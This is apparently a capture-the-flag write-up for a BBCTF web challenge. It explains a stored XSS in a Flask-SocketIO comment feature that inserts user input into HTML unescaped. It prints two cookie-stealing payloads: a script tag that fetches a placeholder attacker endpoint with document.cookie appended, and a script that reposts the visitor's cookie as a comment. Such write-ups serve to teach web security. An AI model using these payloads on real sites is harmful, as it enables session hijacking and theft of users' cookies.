# Solution
This one is a [DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
challenge. Why is that and how can you know? Well,
besides blindly injecting HTML into a comment and seeing that it's
parsed as HTML, (give `<script>alert("pls wrk")</script>` a try lol)
into a comment, take a look at what we're given:
1. We have a cookie named `flag` that would have the flag if we were admin (hence the default cookie value of `if only you were admin lol` haha)
2. There is an admin bot (usually a good indicator for a XSS chal)
3. There is functionality to bring the admin to *your* webpage (if you could change the javascript on the site, you could have *your* code execute in *their* browser, i.e.-a DOM XSS attack would be pretty baller)
4. The prompt literally says "steal the admin's cookie" (a bit on the nose haha, but like mentioned above, if another user's cookie is the goal,
XSS should be at the top of the list for things to check for)

Okay, cool. Well, where would you start with a challenge like this?
Usually, when building web challenges, challenge authors seldom give
functionality to the site that is not useful for solving it. The only
real funcionality we have on this site is the commenting system. We can
look at the source too, which the func in charge of adding our comment
is:
```python
@socketio.on('submit comment')
def handle_comment(data):
	comments.append("<p class=\"comment\"><strong>" + data['author'] + ":</strong> " + data['comment'] + "</p>");
	emit('new comment', broadcast=True)
```
Looks like it just adds our name and comment directly into a string that
is then interpreted as HTML. Well, what if our comment and/or name
was just straight up HTML? Guess what, it's also rendered as HTML! A
*really* fun HTMl tag that we can use is the `<script>` tag. Plug in
the example at the top of the page to see it in action, but in short it
allows you to put javascript in a web page that is executed upon loading
the page. This means that you can inject JS straight into the web page,
***and so anyone that visits the site will have your JS executed in
their browser***, sick!!! You can either fetch a web endpoint that you
control (like [https://webhook.site/](https://webhook.site/)) and appending the visitor's cookies to as a URL paramter like so:
```html
<script>fetch("<your_endpoint>/?"+document.cookies)</script>
```
OR you can just straight up put their cookies into a comment using the
site's very own JS functionality!
```html
<script>
document.getElementById('comment-author').value='AnotherUser';
document.getElementById('comment-input').value='cookie: '+document.cookie;
var socket = io.connect('http://' + document.domain + ':' + location.port);
var author = $('#comment-author').val();
var comment = $('#comment-input').val();
console.log('Hellow');
console.log(author);
console.log(comment);
socket.emit('submit comment', {author: author, comment: comment});//{author: author, comment: comment});
$('#comment-author').val('');
$('#comment-input').val('');
</script>
```
It's def more complicated, so why would you want to do that? To that I
answer: it's funny! Either way, you get yourself a brand new flag and
the hardest web challenge for BBCTF is solved.

This challenge was based off of one of my most favorite challenges I
ever made, [The DEW](https://github.com/Pwnut/spaceheroes_ctf_23/tree/main/web),
which NOT solvable via a fetch request to an external endpoint like you
see above. Check it out to see why if you want to learn more web!
